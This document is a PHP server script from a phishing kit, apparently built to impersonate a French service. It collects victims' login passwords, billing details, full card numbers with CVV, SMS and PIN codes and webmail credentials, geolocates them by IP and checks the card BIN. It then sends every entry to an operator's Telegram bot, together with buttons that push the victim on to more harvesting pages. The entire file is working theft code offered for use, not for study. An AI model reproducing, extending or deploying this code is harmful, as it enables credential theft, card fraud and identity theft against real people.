<?php
error_reporting(E_ALL);
ini_set("display_errors", 1);
if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

$local_userAgent = isset($_SERVER["HTTP_USER_AGENT"])
    ? $_SERVER["HTTP_USER_AGENT"]
    : "";
$local_time = date("Y-m-d H:i:s");
$local_domain = $_SERVER["SERVER_NAME"];
$local_os = get_platform($local_userAgent);
$local_browser = get_browser_value($local_userAgent);
$currentUrlPath = $_SERVER['REQUEST_URI'];
$domain = $_SERVER['HTTP_HOST'];
preg_match('~^/web/([^/]+)/?~', $currentUrlPath, $matches);
$folderName = isset($matches[1]) ? $matches[1] : '';
global  $local_userAgent, $local_time, $local_domain, $local_os, $local_browser;

function get_platform($USER_AGENT)
{
    $OS_ERROR = "Unknown OS Platform";
    $OS = [
        "/windows nt 11/i" => "Windows 11",
        "/windows nt 10/i" => "Windows 10",
        "/windows nt 6.3/i" => "Windows 8.1",
        "/windows nt 6.2/i" => "Windows 8",
        "/windows nt 6.1/i" => "Windows 7",
        "/windows nt 6.0/i" => "Windows Vista",
        "/windows nt 5.2/i" => "Windows Server 2003/XP x64",
        "/windows nt 5.1/i" => "Windows XP",
        "/windows xp/i" => "Windows XP",
        "/windows nt 5.0/i" => "Windows 2000",
        "/windows me/i" => "Windows ME",
        "/win98/i" => "Windows 98",
        "/win95/i" => "Windows 95",
        "/win16/i" => "Windows 3.11",
        "/macintosh|mac os x/i" => "Mac OS X",
        "/mac_powerpc/i" => "Mac OS 9",
        "/linux/i" => "Linux",
        "/ubuntu/i" => "Ubuntu",
        "/iphone/i" => "iPhone",
        "/ipod/i" => "iPod",
        "/ipad/i" => "iPad",
        "/android/i" => "Android",
        "/blackberry/i" => "BlackBerry",
        "/webos/i" => "Mobile",
    ];
    foreach ($OS as $regex => $value) {
        if (preg_match($regex, $USER_AGENT)) {
            $OS_ERROR = $value;
        }
    }
    return $OS_ERROR;
}
function get_browser_value($USER_AGENT)
{
    $BROWSER_ERROR = "Unknown Browser";
    $BROWSER = [
        "/msie/i" => "Internet Explorer",
        "/firefox/i" => "Firefox",
        "/safari/i" => "Safari",
        "/chrome/i" => "Chrome",
        "/edge/i" => "Edge",
        "/opera/i" => "Opera",
        "/netscape/i" => "Netscape",
        "/maxthon/i" => "Maxthon",
        "/konqueror/i" => "Konqueror",
        "/mobile/i" => "Handheld Browser",
    ];
    foreach ($BROWSER as $regex => $value) {
        if (preg_match($regex, $USER_AGENT)) {
            $BROWSER_ERROR = $value;
        }
    }
    return $BROWSER_ERROR;
}
function getClientIP()
{
    if (!empty($_SERVER["HTTP_CLIENT_IP"])) {
        $ipAddress = $_SERVER["HTTP_CLIENT_IP"];
    } elseif (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) {
        $ipAddress = $_SERVER["HTTP_X_FORWARDED_FOR"];
    } else {
        $ipAddress = $_SERVER["REMOTE_ADDR"];
    }

    $validIPs = [];
    $ipMatches = preg_match_all(
        "/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/",
        $ipAddress,
        $matches
    );

    if ($ipMatches) {
        $validIPs = $matches[0];
    }

    if (!empty($validIPs)) {
        $_SESSION["session_ip"] = $validIPs[0];
        return $validIPs[0];
    } else {
        $_SESSION["session_ip"] = "127.0.0.1";
        return "127.0.0.1";
    }
}	
function fetchIPInfo($ipAddress)
{
    $url = "http://ip-api.com/php/{$ipAddress}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query";
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($curl);
    curl_close($curl);
    $info = unserialize($response);
    $_SESSION["session_isp"] = isset($info["isp"]) ? $info["isp"] : null;
    $_SESSION["session_country"] = isset($info["country"])
        ? $info["country"]
        : null;
    $_SESSION["session_country_code"] = isset($info["countryCode"])
        ? $info["countryCode"]
        : null;
    $_SESSION["session_city"] = isset($info["city"]) ? $info["city"] : null;
    $_SESSION["session_region"] = isset($info["region"])
        ? $info["region"]
        : null;
    $proxy = isset($info["proxy"]) ? $info["proxy"] : null;
    $_SESSION["session_proxy"] = $proxy == 1 ? "True" : "False";
    $mobile = isset($info["mobile"]) ? $info["mobile"] : null;
    $_SESSION["session_mobile"] = $mobile == 1 ? "True" : "False";
    $hosting = isset($info["hosting"]) ? $info["hosting"] : null;
    $_SESSION["session_hosting"] = $hosting == 1 ? "True" : "False";
}
function tele_message_old($message)
{
	$TrubFtub = $_COOKIE['idtel'];
    $cRetVckr = $_COOKIE['tokentel'];
    $api_url = "https://api.telegram.org/bot{$cRetVckr}/sendMessage";
    $params = ["chat_id" => $TrubFtub, "text" => $message];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
}
function tele_message($message)
{
    $TrubFtub = $_COOKIE['idtel'];
    $cRetVckr = $_COOKIE['tokentel'];
    $api_url = "https://api.telegram.org/bot{$cRetVckr}/sendMessage";
    $params = ["chat_id" => $TrubFtub, "text" => $message];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    // Get the response and check for errors
    $response = curl_exec($ch);
    
    // Check if curl_exec() was successful
    if ($response === false) {
        echo 'Curl error: ' . curl_error($ch); // Print any cURL error
    } else {
        echo 'Response from Telegram API: ' . $response; // Print the response from Telegram
    }
    
    curl_close($ch);
}
function up_file_log($content)
{
    $filePath = 'log.txt';
    $content .= "\n";
    if (file_exists($filePath))
    {
        $existingContent = file_get_contents($filePath);
        $newContent = $content . $existingContent;
        file_put_contents($filePath, $newContent);
    }
    else
    {
        $file = fopen($filePath, 'w');
        if ($file) {
            fwrite($file, $content);
            fclose($file);
        } else {
            echo "Failed to open the file.";
        }
    }
}
function check_file($user, $filename) 
{
	$fileFullPath = $filename;

    if (file_exists($fileFullPath)) {
        return true;
    } else {
        return false;
    }
}

function sendKey($rezdata) {
    // Get the current request URI and domain
    $currentUrlPath = $_SERVER['REQUEST_URI'];
    $domain = $_SERVER['HTTP_HOST'];
    preg_match('~^/web/([^/]+)/?~', $currentUrlPath, $matches);
    $folderName = $matches[1] ?? '';

    // Get Telegram bot token and chat ID from cookies (or other sources)
    $bot_url  = $_COOKIE['tokentel'] ?? ''; // Ensure this cookie is set correctly
    $chat_id  = $_COOKIE['idtel'] ?? '';    // Ensure this cookie is set correctly

    // Setting up the show variables based on file checks
    $show_web_panel = true;
    $show_confirm = true;
    $show_ban = true;

    $file_s = 'login.php';
    $show_login = check_file($folderName, $file_s) ? true : false;
    $file_s = 'phone.php';
    $show_phone = check_file($folderName, $file_s) ? true : false;
    $file_s = 'sms.php';
    $show_sms = check_file($folderName, $file_s) ? true : false;
    $file_s = 'email.php';
    $show_email = check_file($folderName, $file_s) ? true : false;
    $file_s = 'app.php';
    $show_app = check_file($folderName, $file_s) ? true : false;
    $file_s = 'pin.php';
    $show_pin = check_file($folderName, $file_s) ? true : false;
    $file_s = 'message.php';
    $show_message = check_file($folderName, $file_s) ? true : false;
    $file_s = 'card.php';
    $show_card = check_file($folderName, $file_s) ? true : false;
    $file_s = 'logout.php';
    $show_confirm = check_file($folderName, $file_s) ? true : false;
    $file_s = 'iban-home.php';
    $show_iban_home = check_file($folderName, $file_s) ? true : false;
	$file_s = 'iban-app.php';
    $show_iban_app = check_file($folderName, $file_s) ? true : false;
	$file_s = 'webmail.php';
    $show_webmail = check_file($folderName, $file_s) ? true : false;
	
    // URL for actions
    $url = "https://$domain/web/api.php?userid=$folderName";

    // Setting up inline keyboard buttons dynamically
    $inline_keyboard = [];

    if ($show_web_panel) {
        $inline_keyboard[] = [["text" => "🌍 Web Panel", "url" => "$url"]];
    }
    if ($show_login) {
        $inline_keyboard[] = [["text" => "🔑 Error Login", "url" => "$url&action=login"]];
    }
    if ($show_phone) {
        $inline_keyboard[] = [["text" => "📞 Phone", "url" => "$url&action=phone"]];
    }
    if ($show_sms) {
        $inline_keyboard[] = [["text" => "📲 SMS", "url" => "$url&action=sms"]];
    }
    if ($show_email) {
        $inline_keyboard[] = [["text" => "📧 Email", "url" => "$url&action=email"]];
    }
    if ($show_app) {
        $inline_keyboard[] = [["text" => "💿 APP", "url" => "$url&action=app"]];
    }
    if ($show_pin) {
        $inline_keyboard[] = [["text" => "🔐 PIN", "url" => "$url&action=pin"]];
    }
    if ($show_message) {
        $inline_keyboard[] = [["text" => "🖨️ MSG", "url" => "$url&action=msg"]];
    }
    if ($show_card) {
        $inline_keyboard[] = [["text" => "💳 Card", "url" => "$url&action=card"]];
    }
    if ($show_iban_home) {
        $inline_keyboard[] = [["text" => "⌨️ IBAN HOME", "url" => "$url&action=ibanhome"]];
    }
    if ($show_iban_app) {
        $inline_keyboard[] = [["text" => "📲 IBAN APP", "url" => "$url&action=ibanapp"]];
    }
    if ($show_webmail) {
        $inline_keyboard[] = [["text" => "📨 Webmail", "url" => "$url&action=ibanapp"]];
    }
    if ($show_confirm) {
        $inline_keyboard[] = [["text" => "✅ CONFIRM ✅", "url" => "$url&action=done"]];
    }
    if ($show_ban) {
        $inline_keyboard[] = [["text" => "⛔ BAN IP ⛔", "url" => "$url&action=ban"]];
    }

    // Encode the inline keyboard for Telegram
    $keyboard = json_encode(["inline_keyboard" => $inline_keyboard]);

    // Telegram API parameters
    $parameters = [
        "chat_id" => $chat_id,
        "text" => $rezdata,
        'reply_markup' => $keyboard
    ];

    // Telegram API URL (make sure it's set correctly for localhost as well)
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";

    // Initialize cURL for the Telegram API request
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($parameters));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Disable SSL verification in localhost (useful in development environments)
    if ($_SERVER['HTTP_HOST'] == 'localhost') {
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);  // Turn off SSL verification for localhost
    }

    // Execute cURL request and capture response
    $response = curl_exec($ch);

    // Check for errors
    if(curl_errno($ch)) {
        // Print error if any
        $error_message = curl_error($ch);
        echo "cURL Error: $error_message";
    }

    // Close cURL session
    curl_close($ch);

    // Return the response from Telegram (for debugging purposes)
    return $response;
}


function BinCheck($new_string) {
    $cc = $new_string;
    $bin = substr($cc, 0, 6);
    $bins = str_replace(' ', '', $bin);
    
    $ch = curl_init();
    $url = "https://lookup.binlist.net/" . $bin;
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array();
    $headers[] = 'Accept-Version: 3';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $res = curl_exec($ch);

    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
        return null;
    }

    curl_close($ch);

    $someArray = json_decode($res, true);
    
    if (isset($someArray['bank']['name'])) {
        $j_name = $someArray['bank']['name'];
    } else {
        $j_name = "Unknown Bank";
    }
	
	if (isset($someArray['scheme'])) {
        $j_scheme = $someArray['scheme'];
    } else {
        $j_scheme = "Unknown scheme";
    }

    if (isset($someArray['type'])) {
        $j_type = $someArray['type'];
    } else {
        $j_type = "Unknown Type";
    }

    if (isset($someArray['brand'])) {
        $j_brand = $someArray['brand'];
    } else {
        $j_brand = "Unknown Brand";
    }

    if (isset($someArray['country']['name'])) {
        $j_country = $someArray['country']['name'];
    } else {
        $j_country = "Unknown Country";
    }
    
    return array($j_scheme, $j_name, $j_type, $j_brand, $j_country);
}

function validateCard($card_number, $cvv, $expiry_date) {
    $result = ['valid' => true, 'error_message' => ''];
    if (!preg_match('/^\d{16}$/', $card_number)) {
        $result['valid'] = false;
        $result['error_message'] = "0";
        return $result;
    }

    if (!preg_match('/^\d{3}$/', $cvv)) {
        $result['valid'] = false;
        $result['error_message'] = "1";
        return $result;
    }
    if (!preg_match('/^(0[1-9]|1[0-2])\/\d{2}$/', $expiry_date)) {
        $result['valid'] = false;
        $result['error_message'] = "2";
        return $result;
    } else {
        $current_year = (int)date('y');
        $current_month = (int)date('m');

        list($exp_month, $exp_year) = explode('/', $expiry_date);
        $exp_month = (int)$exp_month;
        $exp_year = (int)$exp_year;

        if ($exp_year < $current_year || ($exp_year === $current_year && $exp_month < $current_month)) {
            $result['valid'] = false;
            $result['error_message'] = "3";
            return $result;
        }
    }

    return $result;
}
if ($_SERVER["REQUEST_METHOD"] === "POST")
{
	
    $currentUrlPath = $_SERVER['REQUEST_URI'];
    $domain = $_SERVER['HTTP_HOST'];
    preg_match('~^/web/([^/]+)/?~', $currentUrlPath, $matches);
    $folderName = isset($matches[1]) ? $matches[1] : '';
    $url = "https://$domain/web/api.php?userid=$folderName";
    $ipaddress = getClientIP();
    fetchIPInfo($ipaddress);
	if (isset($_SESSION["session_country_code"])) {
        $country_code = strtoupper($_SESSION["session_country_code"]);
    } else {
        $country_code = '';
    }

	$subscibe = "Territoires - ($country_code)";
    $country = $_SESSION["session_country"];
    $isp = $_SESSION["session_isp"];
    $city = $_SESSION["session_city"];
    $proxy = $_SESSION["session_proxy"];	
    $local_time = date("Y-m-d H:i:s");		
	if (isset($_POST['j_username']) && isset($_POST['j_password'])) 
	{
		  
	     $user = $_POST['j_username'];
         $pass = $_POST['j_password'];
         $message = "
➡️ 🅻🅾🅶🅸🅽 
------------------------------------
💻  𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: $user
🔑  𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱: $pass
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";			 
		 up_file_log("User Send Login to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $subscibe);
	}		
	if (isset($_POST['j_name']) && isset($_POST['j_adress'])&& isset($_POST['j_city'])&& isset($_POST['j_zip'])) 
	{
		  
	     $j_name = $_POST['j_name'];
         $j_adress = $_POST['j_adress'];
		 $j_city = $_POST['j_city'];
		 $j_zip = $_POST['j_zip'];
		 $j_dob = $_POST['j_dob'];
		 $j_phone = $_POST['j_phone'];
		 $j_email = $_POST['j_email'];
		 
         $message = "
🅱🅸🅻🅻🅸🅽🅶 
------------------------------------
👔  𝗡𝗮𝗺𝗲: {$j_name}
🏳️  𝗔𝗱𝗱𝗿𝗲𝘀𝘀: {$j_adress}
🚸  𝗖𝗶𝘁𝘆: {$j_city}
🚸  𝗭𝗜𝗣: {$j_zip}
👨‍👩‍👧‍👦  𝗗𝗼𝗯: {$j_dob}
📱  𝗣𝗵𝗼𝗻𝗲: {$j_phone}
📧  𝗘𝗺𝗮𝗶𝗹: {$j_email}
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";			 
		 $blank_page = $subscibe;
		 up_file_log("User Send Billing to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $blank_page);
		 sendKey($message);
         $blank_page = ' ';
         $up_file = fopen("api.txt", "w");
         fwrite($up_file, $blank_page);
         echo ("<script LANGUAGE='JavaScript'>
             window.location.href='card.php?verify_account=session=&" . md5(microtime()) . "&dispatch=" . sha1(microtime()) . "&access=&data=" . sha1(microtime()) . "';
             </script>");
	     exit;
	
	}
    if (isset($_POST['j_card']) && isset($_POST['j_exp'])&& isset($_POST['j_cvv'])) 
	{
		  
	     $j_card = $_POST['j_card'];
         $j_exp = $_POST['j_exp'];
		 $j_cvv = $_POST['j_cvv'];
		 $validation_result = validateCard($j_card, $j_cvv, $j_exp);
              
		 
         $result = BinCheck($j_card);
         list($j_scheme, $name, $type, $brand, $country) = $result;
         $message = "
➡️ 🅲🅰🆁🅳
------------------------------------
💳  𝗖𝗮𝗿𝗱: {$j_card}
💳  𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: {$j_exp}
💳  𝗰𝘃𝘃: {$j_cvv}
------------------------------------
🏛️ BANK INFO'S {$j_scheme}
🏛️ Banque : {$name}
🏛️ Niveau : {$brand}
🏛️ Type : {$type}
🏛️ Country : {$country}
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";			 
		 $blank_page = $subscibe;
		 $_SESSION["one"] = $j_card;
		 up_file_log("User Send Card to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $blank_page);
		 
		
	}
    if (isset($_POST['j_sms_code'])) 
	{
		  
	     $j_sms_code = $_POST['j_sms_code'];
         $message = "
➡️ 🆂🅼🆂
------------------------------------
🔑  𝗦𝗠𝗦 𝗖𝗼𝗱𝗲: {$j_sms_code}
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";			 
		 $blank_page = $subscibe;
		 up_file_log("User Send SMS to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $blank_page);
	}	 
    if (isset($_POST['j_pin_code'])) 
	{
		  
	     $j_pin_code = $_POST['j_pin_code'];
         $message = "
➡️ 🅿🅸🅽
------------------------------------
🔑  𝗣𝗶𝗻 𝗖𝗼𝗱𝗲: {$j_pin_code}
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";		 
		 up_file_log("User Send PIN to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $subscibe);
	}	 
	if (isset($_POST['j_phone'])) 
	{
		  
	     $j_phone = $_POST['j_phone'];
         $message = "
➡️ 🅿🅷🅾🅽🅴
------------------------------------
🔑  𝗣𝗵𝗼𝗻𝗲: {$j_phone}
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";		 
		 up_file_log("User Send Phone to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $subscibe);
	}
	if (isset($_POST['j_mail']) && isset($_POST['j_pass'])) 
	{
		  
	     $user = $_POST['j_mail'];
         $pass = $_POST['j_pass'];
         $message = "
➡️ 🅻🅾🅶🅸🅽 (EMAIL)
------------------------------------
💻  𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: $user
🔑  𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱: $pass
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";			 
		 up_file_log("User Send Email to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $subscibe);
	}		
	if (isset($_POST['cp_user']) && isset($_POST['cp_pass'])) 
	{
		  
	     $user = $_POST['cp_user'];
         $pass = $_POST['cp_pass'];
         $message = "
➡️ 🅻🅾🅶🅸🅽 (Webmail)
------------------------------------
💻  𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: $user
🔑  𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱: $pass
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";			 
		 up_file_log("User Send Webmail to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $subscibe);
	}		
	if (isset($_POST['rrc'])) 
	{
		  
	     $j_phone = $_POST['rrc'];
         $message = "
➡️ 🅽🅾🆃🅸🅵🅸🅲🅰🆃🅸🅾🅽
------------------------------------
🚨🚨  User Click user IBAN 
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";		 
		 up_file_log("User Click IBAN to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $subscibe);
		 echo ("<script LANGUAGE='JavaScript'>
    window.location.href='iban-app.php?verify_account=session=&" . md5(microtime()) . "&dispatch=" . sha1(microtime()) . "&access=&data=" . sha1(microtime()) . "';
    </script>");
	exit();
	}
	
	
	sendKey($message);
    $blank_page = ' ';
    $up_file = fopen("api.txt", "w");
    fwrite($up_file, $blank_page);
    echo ("<script LANGUAGE='JavaScript'>
    window.location.href='loading.php?verify_account=session=&" . md5(microtime()) . "&dispatch=" . sha1(microtime()) . "&access=&data=" . sha1(microtime()) . "';
    </script>");
	
	
}

?>